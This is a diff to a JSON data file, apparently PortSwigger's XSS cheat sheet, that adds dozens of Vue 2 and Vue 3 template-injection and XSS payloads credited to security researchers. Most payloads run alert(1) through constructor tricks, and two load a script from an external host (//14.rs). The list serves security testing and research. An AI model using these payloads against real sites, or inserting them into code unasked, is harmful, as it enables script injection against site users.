@@ -10,7 +10,8 @@
         "vector": "{{constructor.constructor('alert(1)')()}}",
         "hash": "",
         "type": "reflected",
-        "csp": false
+        "csp": false,
+        "version" : 2
     },
     {
         "authors": [
@@ -38,7 +39,8 @@
         "vector": "<div v-html=\"''.constructor.constructor('alert(1)')()\">a</div>",
         "hash": "",
         "type": "reflected",
-        "csp": false
+        "csp": false,
+        "version" : 2
     },
     {
         "authors": [
@@ -51,7 +53,8 @@
         "vector": "<x v-html=_c.constructor('alert(1)')()>",
         "hash": "",
         "type": "reflected",
-        "csp": false
+        "csp": false,
+        "version" : 2
     },
     {
         "authors": [
@@ -64,6 +67,1107 @@
         "vector": "<x v-if=_c.constructor('alert(1)')()>",
         "hash": "",
         "type": "reflected",
-        "csp": false
+        "csp": false,
+        "version" : 2
+    },
+    {
+        "authors": [
+            {
+                "name": "Gareth Heyes",
+                "company": "PortSwigger",
+                "twitterUrl": "https:\/\/twitter.com\/garethheyes"
+            },
+            {
+                "name": "Lewis Ardern",
+                "company": "",
+                "twitterUrl": "https:\/\/twitter.com\/LewisArdern"
+            },
+            {
+                "name": "PwnFunction",
+                "company": "Independent consultant",
+                "twitterUrl": "https:\/\/twitter.com\/PwnFunction"
+            }
+
+        ],
+        "vector": "{{_c.constructor('alert(1)')()}}",
+        "hash": "",
+        "type": "reflected",
+        "csp": false,
+        "version" : 2
+    },
+    {
+        "authors": [
+            {
+                "name": "Gareth Heyes",
+                "company": "PortSwigger",
+                "twitterUrl": "https:\/\/twitter.com\/garethheyes"
+            },
+            {
+                "name": "Lewis Ardern",
+                "company": "",
+                "twitterUrl": "https:\/\/twitter.com\/LewisArdern"
+            },
+            {
+                "name": "PwnFunction",
+                "company": "Independent consultant",
+                "twitterUrl": "https:\/\/twitter.com\/PwnFunction"
+            }
+
+        ],
+        "vector": "{{_v.constructor('alert(1)')()}}",
+        "hash": "",
+        "type": "reflected",
+        "csp": false,
+        "version" : 2
+    },
+    {
+        "authors": [
+            {
+                "name": "Gareth Heyes",
+                "company": "PortSwigger",
+                "twitterUrl": "https:\/\/twitter.com\/garethheyes"
+            },
+            {
+                "name": "Lewis Ardern",
+                "company": "",
+                "twitterUrl": "https:\/\/twitter.com\/LewisArdern"
+            },
+            {
+                "name": "PwnFunction",
+                "company": "Independent consultant",
+                "twitterUrl": "https:\/\/twitter.com\/PwnFunction"
+            }
+
+        ],
+        "vector": "{{_s.constructor('alert(1)')()}}",
+        "hash": "",
+        "type": "reflected",
+        "csp": false,
+        "version" : 2
+    },
+    {
+        "authors": [
+            {
+                "name": "Gareth Heyes",
+                "company": "PortSwigger",
+                "twitterUrl": "https:\/\/twitter.com\/garethheyes"
+            },
+            {
+                "name": "Lewis Ardern",
+                "company": "",
+                "twitterUrl": "https:\/\/twitter.com\/LewisArdern"
+            },
+            {
+                "name": "PwnFunction",
+                "company": "Independent consultant",
+                "twitterUrl": "https:\/\/twitter.com\/PwnFunction"
+            }
+
+        ],
+        "vector": "<p v-show=\"_c.constructor`alert(1)`()\">",
+        "hash": "",
+        "type": "reflected",
+        "csp": false,
+        "version" : 2
+    },
+    {
+        "authors": [
+            {
+                "name": "Gareth Heyes",
+                "company": "PortSwigger",
+                "twitterUrl": "https:\/\/twitter.com\/garethheyes"
+            },
+            {
+                "name": "Lewis Ardern",
+                "company": "",
+                "twitterUrl": "https:\/\/twitter.com\/LewisArdern"
+            },
+            {
+                "name": "PwnFunction",
+                "company": "Independent consultant",
+                "twitterUrl": "https:\/\/twitter.com\/PwnFunction"
+            }
+
+        ],
+        "vector": "<x v-on:click='_b.constructor`alert(1)`()'>click</x>",
+        "hash": "",
+        "type": "reflected",
+        "csp": false,
+        "version" : 2
+    },
+    {
+        "authors": [
+            {
+                "name": "Gareth Heyes",
+                "company": "PortSwigger",
+                "twitterUrl": "https:\/\/twitter.com\/garethheyes"
+            },
+            {
+                "name": "Lewis Ardern",
+                "company": "",
+                "twitterUrl": "https:\/\/twitter.com\/LewisArdern"
+            },
+            {
+                "name": "PwnFunction",
+                "company": "Independent consultant",
+                "twitterUrl": "https:\/\/twitter.com\/PwnFunction"
+            }
+
+        ],
+        "vector": "<x v-bind:a='_b.constructor`alert(1)`()'>",
+        "hash": "",
+        "type": "reflected",
+        "csp": false,
+        "version" : 2
+    },
+    {
+        "authors": [
+            {
+                "name": "Gareth Heyes",
+                "company": "PortSwigger",
+                "twitterUrl": "https:\/\/twitter.com\/garethheyes"
+            },
+            {
+                "name": "Lewis Ardern",
+                "company": "",
+                "twitterUrl": "https:\/\/twitter.com\/LewisArdern"
+            },
+            {
+                "name": "PwnFunction",
+                "company": "Independent consultant",
+                "twitterUrl": "https:\/\/twitter.com\/PwnFunction"
+            }
+
+        ],
+        "vector": "<x @[_b.constructor`alert(1)`()]>",
+        "hash": "",
+        "type": "reflected",
+        "csp": false,
+        "version" : 2
+    },
+    {
+        "authors": [
+            {
+                "name": "Gareth Heyes",
+                "company": "PortSwigger",
+                "twitterUrl": "https:\/\/twitter.com\/garethheyes"
+            },
+            {
+                "name": "Lewis Ardern",
+                "company": "",
+                "twitterUrl": "https:\/\/twitter.com\/LewisArdern"
+            },
+            {
+                "name": "PwnFunction",
+                "company": "Independent consultant",
+                "twitterUrl": "https:\/\/twitter.com\/PwnFunction"
+            }
+
+        ],
+        "vector": "<x :[_b.constructor`alert(1)`()]>",
+        "hash": "",
+        "type": "reflected",
+        "csp": false,
+        "version" : 2
+    },
+    {
+        "authors": [
+            {
+                "name": "Gareth Heyes",
+                "company": "PortSwigger",
+                "twitterUrl": "https:\/\/twitter.com\/garethheyes"
+            },
+            {
+                "name": "Lewis Ardern",
+                "company": "",
+                "twitterUrl": "https:\/\/twitter.com\/LewisArdern"
+            },
+            {
+                "name": "PwnFunction",
+                "company": "Independent consultant",
+                "twitterUrl": "https:\/\/twitter.com\/PwnFunction"
+            }
+
+        ],
+        "vector": "<p v-=_c.constructor`alert(1)`()>",
+        "hash": "",
+        "type": "reflected",
+        "csp": false,
+        "version" : 2
+    },
+    {
+        "authors": [
+            {
+                "name": "Gareth Heyes",
+                "company": "PortSwigger",
+                "twitterUrl": "https:\/\/twitter.com\/garethheyes"
+            },
+            {
+                "name": "Lewis Ardern",
+                "company": "",
+                "twitterUrl": "https:\/\/twitter.com\/LewisArdern"
+            },
+            {
+                "name": "PwnFunction",
+                "company": "Independent consultant",
+                "twitterUrl": "https:\/\/twitter.com\/PwnFunction"
+            }
+
+        ],
+        "vector": "<x #[_c.constructor`alert(1)`()]>",
+        "hash": "",
+        "type": "reflected",
+        "csp": false,
+        "version" : 2
+    },
+    {
+        "authors": [
+            {
+                "name": "Gareth Heyes",
+                "company": "PortSwigger",
+                "twitterUrl": "https:\/\/twitter.com\/garethheyes"
+            },
+            {
+                "name": "Lewis Ardern",
+                "company": "",
+                "twitterUrl": "https:\/\/twitter.com\/LewisArdern"
+            },
+            {
+                "name": "PwnFunction",
+                "company": "Independent consultant",
+                "twitterUrl": "https:\/\/twitter.com\/PwnFunction"
+            }
+
+        ],
+        "vector": "<p :=_c.constructor`alert(1)`()>",
+        "hash": "",
+        "type": "reflected",
+        "csp": false,
+        "version" : 2
+    },
+    {
+        "authors": [
+            {
+                "name": "Gareth Heyes",
+                "company": "PortSwigger",
+                "twitterUrl": "https:\/\/twitter.com\/garethheyes"
+            },
+            {
+                "name": "Lewis Ardern",
+                "company": "",
+                "twitterUrl": "https:\/\/twitter.com\/LewisArdern"
+            },
+            {
+                "name": "PwnFunction",
+                "company": "Independent consultant",
+                "twitterUrl": "https:\/\/twitter.com\/PwnFunction"
+            }
+
+        ],
+        "vector": "{{_c.constructor('alert(1)')()}}",
+        "hash": "",
+        "type": "reflected",
+        "csp": false,
+        "version" : 2
+    },
+    {
+        "authors": [
+            {
+                "name": "Gareth Heyes",
+                "company": "PortSwigger",
+                "twitterUrl": "https:\/\/twitter.com\/garethheyes"
+            },
+            {
+                "name": "Lewis Ardern",
+                "company": "",
+                "twitterUrl": "https:\/\/twitter.com\/LewisArdern"
+            },
+            {
+                "name": "PwnFunction",
+                "company": "Independent consultant",
+                "twitterUrl": "https:\/\/twitter.com\/PwnFunction"
+            }
+
+        ],
+        "vector": "{{_b.constructor`alert(1)`()}}",
+        "hash": "",
+        "type": "reflected",
+        "csp": false,
+        "version" : 2
+    },
+    {
+        "authors": [
+            {
+                "name": "Gareth Heyes",
+                "company": "PortSwigger",
+                "twitterUrl": "https:\/\/twitter.com\/garethheyes"
+            },
+            {
+                "name": "Lewis Ardern",
+                "company": "",
+                "twitterUrl": "https:\/\/twitter.com\/LewisArdern"
+            },
+            {
+                "name": "PwnFunction",
+                "company": "Independent consultant",
+                "twitterUrl": "https:\/\/twitter.com\/PwnFunction"
+            }
+
+        ],
+        "vector": "<x v-bind:is=\"'script'\" src=\"//14.rs\" />",
+        "hash": "",
+        "type": "reflected",
+        "csp": false,
+        "version" : 2
+    },
+    {
+        "authors": [
+            {
+                "name": "Gareth Heyes",
+                "company": "PortSwigger",
+                "twitterUrl": "https:\/\/twitter.com\/garethheyes"
+            },
+            {
+                "name": "Lewis Ardern",
+                "company": "",
+                "twitterUrl": "https:\/\/twitter.com\/LewisArdern"
+            },
+            {
+                "name": "PwnFunction",
+                "company": "Independent consultant",
+                "twitterUrl": "https:\/\/twitter.com\/PwnFunction"
+            }
+
+        ],
+        "vector": "<x is=script src=//⑭.₨>",
+        "hash": "",
+        "type": "reflected",
+        "csp": false,
+        "version" : 2
+    },
+    {
+        "authors": [
+            {
+                "name": "Gareth Heyes",
+                "company": "PortSwigger",
+                "twitterUrl": "https:\/\/twitter.com\/garethheyes"
+            },
+            {
+                "name": "Lewis Ardern",
+                "company": "",
+                "twitterUrl": "https:\/\/twitter.com\/LewisArdern"
+            },
+            {
+                "name": "PwnFunction",
+                "company": "Independent consultant",
+                "twitterUrl": "https:\/\/twitter.com\/PwnFunction"
+            }
+
+        ],
+        "vector": "<x @click='_b.constructor`alert(1)`()'>click<\/x>",
+        "hash": "",
+        "type": "reflected",
+        "csp": false,
+        "version" : 2
+    },
+    {
+        "authors": [
+            {
+                "name": "Gareth Heyes",
+                "company": "PortSwigger",
+                "twitterUrl": "https:\/\/twitter.com\/garethheyes"
+            },
+            {
+                "name": "Lewis Ardern",
+                "company": "",
+                "twitterUrl": "https:\/\/twitter.com\/LewisArdern"
+            },
+            {
+                "name": "PwnFunction",
+                "company": "Independent consultant",
+                "twitterUrl": "https:\/\/twitter.com\/PwnFunction"
+            }
+
+        ],
+        "vector": "<x @[_b.constructor`alert(1)`()]>",
+        "hash": "",
+        "type": "reflected",
+        "csp": false,
+        "version" : 2
+    },
+    {
+        "authors": [
+            {
+                "name": "Gareth Heyes",
+                "company": "PortSwigger",
+                "twitterUrl": "https:\/\/twitter.com\/garethheyes"
+            },
+            {
+                "name": "Lewis Ardern",
+                "company": "",
+                "twitterUrl": "https:\/\/twitter.com\/LewisArdern"
+            },
+            {
+                "name": "PwnFunction",
+                "company": "Independent consultant",
+                "twitterUrl": "https:\/\/twitter.com\/PwnFunction"
+            }
+
+        ],
+        "vector": "<x :[_b.constructor`alert(1)`()]>",
+        "hash": "",
+        "type": "reflected",
+        "csp": false,
+        "version" : 2
+    },
+    {
+        "authors": [
+            {
+                "name": "Gareth Heyes",
+                "company": "PortSwigger",
+                "twitterUrl": "https:\/\/twitter.com\/garethheyes"
+            },
+            {
+                "name": "Lewis Ardern",
+                "company": "",
+                "twitterUrl": "https:\/\/twitter.com\/LewisArdern"
+            },
+            {
+                "name": "PwnFunction",
+                "company": "Independent consultant",
+                "twitterUrl": "https:\/\/twitter.com\/PwnFunction"
+            }
+
+        ],
+        "vector": "<x #[_c.constructor`alert(1)`()]>",
+        "hash": "",
+        "type": "reflected",
+        "csp": false,
+        "version" : 2
+    },
+    {
+        "authors": [
+            {
+                "name": "Gareth Heyes",
+                "company": "PortSwigger",
+                "twitterUrl": "https:\/\/twitter.com\/garethheyes"
+            },
+            {
+                "name": "Lewis Ardern",
+                "company": "",
+                "twitterUrl": "https:\/\/twitter.com\/LewisArdern"
+            },
+            {
+                "name": "PwnFunction",
+                "company": "Independent consultant",
+                "twitterUrl": "https:\/\/twitter.com\/PwnFunction"
+            }
+
+        ],
+        "vector": "<x title\"=\"&lt;iframe&Tab;onload&Tab;=alert(1)&gt;\">",
+        "hash": "",
+        "type": "reflected",
+        "csp": false,
+        "version" : 2
+    },
+    {
+        "authors": [
+            {
+                "name": "Gareth Heyes",
+                "company": "PortSwigger",
+                "twitterUrl": "https:\/\/twitter.com\/garethheyes"
+            },
+            {
+                "name": "Lewis Ardern",
+                "company": "",
+                "twitterUrl": "https:\/\/twitter.com\/LewisArdern"
+            },
+            {
+                "name": "PwnFunction",
+                "company": "Independent consultant",
+                "twitterUrl": "https:\/\/twitter.com\/PwnFunction"
+            }
+
+        ],
+        "vector": "<x title\"=\"&lt;iframe&Tab;onload&Tab;=setTimeout(/alert(1)/.source)&gt;\">",
+        "hash": "",
+        "type": "reflected",
+        "csp": false,
+        "version" : 2
+    },
+    {
+        "authors": [
+            {
+                "name": "Gareth Heyes",
+                "company": "PortSwigger",
+                "twitterUrl": "https:\/\/twitter.com\/garethheyes"
+            },
+            {
+                "name": "Lewis Ardern",
+                "company": "",
+                "twitterUrl": "https:\/\/twitter.com\/LewisArdern"
+            },
+            {
+                "name": "PwnFunction",
+                "company": "Independent consultant",
+                "twitterUrl": "https:\/\/twitter.com\/PwnFunction"
+            }
+
+        ],
+        "vector": "<xyz<img/src onerror=alert(1)>>",
+        "hash": "",
+        "type": "reflected",
+        "csp": false,
+        "version" : 2
+    },
+    {
+        "authors": [
+            {
+                "name": "Gareth Heyes",
+                "company": "PortSwigger",
+                "twitterUrl": "https:\/\/twitter.com\/garethheyes"
+            },
+            {
+                "name": "Lewis Ardern",
+                "company": "",
+                "twitterUrl": "https:\/\/twitter.com\/LewisArdern"
+            },
+            {
+                "name": "PwnFunction",
+                "company": "Independent consultant",
+                "twitterUrl": "https:\/\/twitter.com\/PwnFunction"
+            }
+
+        ],
+        "vector": "<svg><svg><b><noscript>&lt;/noscript&gt;&lt;iframe&Tab;onload=setTimeout(/alert(1)/.source)&gt;<\/noscript><\/b><\/svg>",
+        "hash": "",
+        "type": "reflected",
+        "csp": false,
+        "version" : 2
+    },
+    {
+        "authors": [
+            {
+                "name": "Gareth Heyes",
+                "company": "PortSwigger",
+                "twitterUrl": "https:\/\/twitter.com\/garethheyes"
+            },
+            {
+                "name": "Lewis Ardern",
+                "company": "",
+                "twitterUrl": "https:\/\/twitter.com\/LewisArdern"
+            },
+            {
+                "name": "PwnFunction",
+                "company": "Independent consultant",
+                "twitterUrl": "https:\/\/twitter.com\/PwnFunction"
+            }
+
+        ],
+        "vector": "<a @['c\\lic\\u{6b}']=\"_c.constructor('alert(1)')()\">test<\/a>",
+        "hash": "",
+        "type": "reflected",
+        "csp": false,
+        "version" : 2
+    },
+    {
+        "authors": [
+            {
+                "name": "Gareth Heyes",
+                "company": "PortSwigger",
+                "twitterUrl": "https:\/\/twitter.com\/garethheyes"
+            },
+            {
+                "name": "Lewis Ardern",
+                "company": "",
+                "twitterUrl": "https:\/\/twitter.com\/LewisArdern"
+            },
+            {
+                "name": "PwnFunction",
+                "company": "Independent consultant",
+                "twitterUrl": "https:\/\/twitter.com\/PwnFunction"
+            }
+
+        ],
+        "vector": "{{$el.ownerDocument.defaultView.alert(1)}}",
+        "hash": "",
+        "type": "reflected",
+        "csp": false,
+        "version" : 2
+    },
+    {
+        "authors": [
+            {
+                "name": "Gareth Heyes",
+                "company": "PortSwigger",
+                "twitterUrl": "https:\/\/twitter.com\/garethheyes"
+            },
+            {
+                "name": "Lewis Ardern",
+                "company": "",
+                "twitterUrl": "https:\/\/twitter.com\/LewisArdern"
+            },
+            {
+                "name": "PwnFunction",
+                "company": "Independent consultant",
+                "twitterUrl": "https:\/\/twitter.com\/PwnFunction"
+            }
+
+        ],
+        "vector": "{{$el.innerHTML='\\u003cimg src onerror=alert(1)\\u003e'}}",
+        "hash": "",
+        "type": "reflected",
+        "csp": false,
+        "version" : 2
+    },
+    {
+        "authors": [
+            {
+                "name": "Gareth Heyes",
+                "company": "PortSwigger",
+                "twitterUrl": "https:\/\/twitter.com\/garethheyes"
+            },
+            {
+                "name": "Lewis Ardern",
+                "company": "",
+                "twitterUrl": "https:\/\/twitter.com\/LewisArdern"
+            },
+            {
+                "name": "PwnFunction",
+                "company": "Independent consultant",
+                "twitterUrl": "https:\/\/twitter.com\/PwnFunction"
+            }
+
+        ],
+        "vector": "<img src @error=e=$event.path.pop().alert(1)>",
+        "hash": "",
+        "type": "reflected",
+        "csp": false,
+        "version" : 2
+    },
+    {
+        "authors": [
+            {
+                "name": "Gareth Heyes",
+                "company": "PortSwigger",
+                "twitterUrl": "https:\/\/twitter.com\/garethheyes"
+            },
+            {
+                "name": "Lewis Ardern",
+                "company": "",
+                "twitterUrl": "https:\/\/twitter.com\/LewisArdern"
+            },
+            {
+                "name": "PwnFunction",
+                "company": "Independent consultant",
+                "twitterUrl": "https:\/\/twitter.com\/PwnFunction"
+            }
+
+        ],
+        "vector": "<img src @error=e=$event.composedPath().pop().alert(1)>",
+        "hash": "",
+        "type": "reflected",
+        "csp": false,
+        "version" : 2
+    },
+    {
+        "authors": [
+            {
+                "name": "Gareth Heyes",
+                "company": "PortSwigger",
+                "twitterUrl": "https:\/\/twitter.com\/garethheyes"
+            },
+            {
+                "name": "Lewis Ardern",
+                "company": "",
+                "twitterUrl": "https:\/\/twitter.com\/LewisArdern"
+            },
+            {
+                "name": "PwnFunction",
+                "company": "Independent consultant",
+                "twitterUrl": "https:\/\/twitter.com\/PwnFunction"
+            }
+
+        ],
+        "vector": "<img src @error=this.alert(1)>",
+        "hash": "",
+        "type": "reflected",
+        "csp": false,
+        "version" : 2
+    },
+    {
+        "authors": [
+            {
+                "name": "Gareth Heyes",
+                "company": "PortSwigger",
+                "twitterUrl": "https:\/\/twitter.com\/garethheyes"
+            },
+            {
+                "name": "Lewis Ardern",
+                "company": "",
+                "twitterUrl": "https:\/\/twitter.com\/LewisArdern"
+            },
+            {
+                "name": "PwnFunction",
+                "company": "Independent consultant",
+                "twitterUrl": "https:\/\/twitter.com\/PwnFunction"
+            }
+
+        ],
+        "vector": "<svg@load=this.alert(1)>",
+        "hash": "",
+        "type": "reflected",
+        "csp": false,
+        "version" : 2
+    },
+    {
+        "authors": [
+            {
+                "name": "Gareth Heyes",
+                "company": "PortSwigger",
+                "twitterUrl": "https:\/\/twitter.com\/garethheyes"
+            },
+            {
+                "name": "Lewis Ardern",
+                "company": "",
+                "twitterUrl": "https:\/\/twitter.com\/LewisArdern"
+            },
+            {
+                "name": "PwnFunction",
+                "company": "Independent consultant",
+                "twitterUrl": "https:\/\/twitter.com\/PwnFunction"
+            }
+
+        ],
+        "vector": "{{_openBlock.constructor('alert(1)')()}}",
+        "hash": "",
+        "type": "reflected",
+        "csp": false,
+        "version" : 3
+    },
+    {
+        "authors": [
+            {
+                "name": "Gareth Heyes",
+                "company": "PortSwigger",
+                "twitterUrl": "https:\/\/twitter.com\/garethheyes"
+            },
+            {
+                "name": "Lewis Ardern",
+                "company": "",
+                "twitterUrl": "https:\/\/twitter.com\/LewisArdern"
+            },
+            {
+                "name": "PwnFunction",
+                "company": "Independent consultant",
+                "twitterUrl": "https:\/\/twitter.com\/PwnFunction"
+            }
+
+        ],
+        "vector": "{{_createBlock.constructor('alert(1)')()}}",
+        "hash": "",
+        "type": "reflected",
+        "csp": false,
+        "version" : 3
+    },
+    {
+        "authors": [
+            {
+                "name": "Gareth Heyes",
+                "company": "PortSwigger",
+                "twitterUrl": "https:\/\/twitter.com\/garethheyes"
+            },
+            {
+                "name": "Lewis Ardern",
+                "company": "",
+                "twitterUrl": "https:\/\/twitter.com\/LewisArdern"
+            },
+            {
+                "name": "PwnFunction",
+                "company": "Independent consultant",
+                "twitterUrl": "https:\/\/twitter.com\/PwnFunction"
+            }
+
+        ],
+        "vector": "{{_toDisplayString.constructor('alert(1)')()}}",
+        "hash": "",
+        "type": "reflected",
+        "csp": false,
+        "version" : 3
+    },
+    {
+        "authors": [
+            {
+                "name": "Gareth Heyes",
+                "company": "PortSwigger",
+                "twitterUrl": "https:\/\/twitter.com\/garethheyes"
+            },
+            {
+                "name": "Lewis Ardern",
+                "company": "",
+                "twitterUrl": "https:\/\/twitter.com\/LewisArdern"
+            },
+            {
+                "name": "PwnFunction",
+                "company": "Independent consultant",
+                "twitterUrl": "https:\/\/twitter.com\/PwnFunction"
+            }
+
+        ],
+        "vector": "{{_createVNode.constructor('alert(1)')()}}",
+        "hash": "",
+        "type": "reflected",
+        "csp": false,
+        "version" : 3
+    },
+    {
+        "authors": [
+            {
+                "name": "Gareth Heyes",
+                "company": "PortSwigger",
+                "twitterUrl": "https:\/\/twitter.com\/garethheyes"
+            },
+            {
+                "name": "Lewis Ardern",
+                "company": "",
+                "twitterUrl": "https:\/\/twitter.com\/LewisArdern"
+            },
+            {
+                "name": "PwnFunction",
+                "company": "Independent consultant",
+                "twitterUrl": "https:\/\/twitter.com\/PwnFunction"
+            }
+
+        ],
+        "vector": "<p v-show=_createBlock.constructor`alert(1)`()>",
+        "hash": "",
+        "type": "reflected",
+        "csp": false,
+        "version" : 3
+    },
+    {
+        "authors": [
+            {
+                "name": "Gareth Heyes",
+                "company": "PortSwigger",
+                "twitterUrl": "https:\/\/twitter.com\/garethheyes"
+            },
+            {
+                "name": "Lewis Ardern",
+                "company": "",
+                "twitterUrl": "https:\/\/twitter.com\/LewisArdern"
+            },
+            {
+                "name": "PwnFunction",
+                "company": "Independent consultant",
+                "twitterUrl": "https:\/\/twitter.com\/PwnFunction"
+            }
+
+        ],
+        "vector": "<x @[_openBlock.constructor`alert(1)`()]>",
+        "hash": "",
+        "type": "reflected",
+        "csp": false,
+        "version" : 3
+    },
+    {
+        "authors": [
+            {
+                "name": "Gareth Heyes",
+                "company": "PortSwigger",
+                "twitterUrl": "https:\/\/twitter.com\/garethheyes"
+            },
+            {
+                "name": "Lewis Ardern",
+                "company": "",
+                "twitterUrl": "https:\/\/twitter.com\/LewisArdern"
+            },
+            {
+                "name": "PwnFunction",
+                "company": "Independent consultant",
+                "twitterUrl": "https:\/\/twitter.com\/PwnFunction"
+            }
+
+        ],
+        "vector": "<x @[_capitalize.constructor`alert(1)`()]>",
+        "hash": "",
+        "type": "reflected",
+        "csp": false,
+        "version" : 3
+    },
+    {
+        "authors": [
+            {
+                "name": "Gareth Heyes",
+                "company": "PortSwigger",
+                "twitterUrl": "https:\/\/twitter.com\/garethheyes"
+            },
+            {
+                "name": "Lewis Ardern",
+                "company": "",
+                "twitterUrl": "https:\/\/twitter.com\/LewisArdern"
+            },
+            {
+                "name": "PwnFunction",
+                "company": "Independent consultant",
+                "twitterUrl": "https:\/\/twitter.com\/PwnFunction"
+            }
+
+        ],
+        "vector": "<x @click=_withCtx.constructor`alert(1)`()>click<\/x>",
+        "hash": "",
+        "type": "reflected",
+        "csp": false,
+        "version" : 3
+    },
+    {
+        "authors": [
+            {
+                "name": "Gareth Heyes",
+                "company": "PortSwigger",
+                "twitterUrl": "https:\/\/twitter.com\/garethheyes"
+            },
+            {
+                "name": "Lewis Ardern",
+                "company": "",
+                "twitterUrl": "https:\/\/twitter.com\/LewisArdern"
+            },
+            {
+                "name": "PwnFunction",
+                "company": "Independent consultant",
+                "twitterUrl": "https:\/\/twitter.com\/PwnFunction"
+            }
+
+        ],
+        "vector": "<x @click=$event.view.alert(1)>click<\/x>",
+        "hash": "",
+        "type": "reflected",
+        "csp": false,
+        "version" : 3
+    },
+    {
+        "authors": [
+            {
+                "name": "Gareth Heyes",
+                "company": "PortSwigger",
+                "twitterUrl": "https:\/\/twitter.com\/garethheyes"
+            },
+            {
+                "name": "Lewis Ardern",
+                "company": "",
+                "twitterUrl": "https:\/\/twitter.com\/LewisArdern"
+            },
+            {
+                "name": "PwnFunction",
+                "company": "Independent consultant",
+                "twitterUrl": "https:\/\/twitter.com\/PwnFunction"
+            }
+
+        ],
+        "vector": "{{_Vue.h.constructor`alert(1)`()}}",
+        "hash": "",
+        "type": "reflected",
+        "csp": false,
+        "version" : 3
+    },
+    {
+        "authors": [
+            {
+                "name": "Gareth Heyes",
+                "company": "PortSwigger",
+                "twitterUrl": "https:\/\/twitter.com\/garethheyes"
+            },
+            {
+                "name": "Lewis Ardern",
+                "company": "",
+                "twitterUrl": "https:\/\/twitter.com\/LewisArdern"
+            },
+            {
+                "name": "PwnFunction",
+                "company": "Independent consultant",
+                "twitterUrl": "https:\/\/twitter.com\/PwnFunction"
+            }
+
+        ],
+        "vector": "{{$emit.constructor`alert(1)`()}}",
+        "hash": "",
+        "type": "reflected",
+        "csp": false,
+        "version" : 3
+    },
+    {
+        "authors": [
+            {
+                "name": "Gareth Heyes",
+                "company": "PortSwigger",
+                "twitterUrl": "https:\/\/twitter.com\/garethheyes"
+            },
+            {
+                "name": "Lewis Ardern",
+                "company": "",
+                "twitterUrl": "https:\/\/twitter.com\/LewisArdern"
+            },
+            {
+                "name": "PwnFunction",
+                "company": "Independent consultant",
+                "twitterUrl": "https:\/\/twitter.com\/PwnFunction"
+            }
+
+        ],
+        "vector": "<teleport to=script:nth-child(2)>alert&lpar;1&rpar;<\/teleport><\/div><script><\/script>",
+        "hash": "",
+        "type": "reflected",
+        "csp": false,
+        "version" : 3
+    },
+    {
+        "authors": [
+            {
+                "name": "Gareth Heyes",
+                "company": "PortSwigger",
+                "twitterUrl": "https:\/\/twitter.com\/garethheyes"
+            },
+            {
+                "name": "Lewis Ardern",
+                "company": "",
+                "twitterUrl": "https:\/\/twitter.com\/LewisArdern"
+            },
+            {
+                "name": "PwnFunction",
+                "company": "Independent consultant",
+                "twitterUrl": "https:\/\/twitter.com\/PwnFunction"
+            }
+
+        ],
+        "vector": "<teleport to=script:nth-child(2)>alert&lpar;1&rpar;<\/teleport><\/div><script><\/script>",
+        "hash": "",
+        "type": "reflected",
+        "csp": false,
+        "version" : 3
+    },
+    {
+        "authors": [
+            {
+                "name": "Gareth Heyes",
+                "company": "PortSwigger",
+                "twitterUrl": "https:\/\/twitter.com\/garethheyes"
+            },
+            {
+                "name": "Lewis Ardern",
+                "company": "",
+                "twitterUrl": "https:\/\/twitter.com\/LewisArdern"
+            },
+            {
+                "name": "PwnFunction",
+                "company": "Independent consultant",
+                "twitterUrl": "https:\/\/twitter.com\/PwnFunction"
+            }
+
+        ],
+        "vector": "<component is=script text=alert(1)>",
+        "hash": "",
+        "type": "reflected",
+        "csp": false,
+        "version" : 3
     }
 ]
